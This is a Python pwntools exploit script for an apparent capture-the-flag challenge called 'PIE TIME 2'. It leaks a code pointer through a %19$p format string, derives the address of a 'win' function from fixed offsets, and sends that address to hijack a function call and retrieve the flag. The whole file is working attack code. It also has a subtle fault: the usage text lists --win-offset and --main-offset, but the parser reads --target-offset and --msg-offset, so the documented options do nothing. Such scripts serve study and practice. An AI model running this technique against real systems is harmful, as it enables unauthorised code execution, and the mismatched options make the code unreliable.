#!/usr/bin/env python3
"""Generic PIE leak-and-jump solver for ret2win/function-pointer challenges.

Program flow assumed (PIE TIME 2 pattern):
    printf("Enter your name:"); fgets(buf,64,stdin); printf(buf);   # format string leak
    printf(" enter the address to jump to, ex => 0x12345: ");
    scanf("%lx", &val);  ((void(*)())val)();                        # arbitrary call

Strategy:
    1. Leak a code pointer with a positional format string (default %19$p -> main+0x41).
    2. Compute the target (win) address from the known constant offset.
    3. Send it and capture the flag.

Usage:
    python pwn_pie_leak.py <host> <port> [--slot 19] [--leak-offset 0x41] [--win-offset 0x12a7] [--main-offset 0x133d]
"""
import sys
from pwn import context, remote

HOST = "127.0.0.1"
PORT = 12345


def parse_args(argv):
    # main=0x133d, win=0x12a7 (PIE TIME 2); leak points at main+0x41
    opts = {"slot": 19, "leak_off": 0x41, "main_off": 0x133d, "win_off": 0x12a7}
    args = [a for a in argv[1:] if not a.startswith("--")]
    host = args[0] if len(args) > 0 else HOST
    port = int(args[1]) if len(args) > 1 else PORT
    i = 1
    while i < len(argv):
        a = argv[i]
        if a == "--slot":
            opts["slot"] = int(argv[i + 1]); i += 2
        elif a == "--leak-offset":
            opts["leak_off"] = int(argv[i + 1], 0); i += 2
        elif a == "--target-offset":
            opts["win_off"] = int(argv[i + 1], 0); i += 2
        elif a == "--msg-offset":
            opts["main_off"] = int(argv[i + 1], 0); i += 2
        else:
            i += 1
    return host, port, opts


def main():
    context.log_level = "error"
    host, port, o = parse_args(sys.argv)

    r = remote(host, port, timeout=15)
    r.recvuntil(b"Enter your name:")
    r.sendline(("%%%d$p" % o["slot"]).encode())
    line = r.recvline()
    print("[*] leak line:", line)
    leak = int(line.split(b" ")[0], 16)
    print("[*] leak: %#x" % leak)

    # win = leak - leak_off - (main_off - win_off)
    win = leak - o["leak_off"] - (o["main_off"] - o["win_off"])
    print("[*] target (win): %#x" % win)

    r.recvuntil(b"enter the address to jump to, ex => 0x12345: ")
    r.sendline(hex(win).encode())
    print(r.recvall(timeout=10).decode(errors="replace"))
    r.close()


if __name__ == "__main__":
    main()
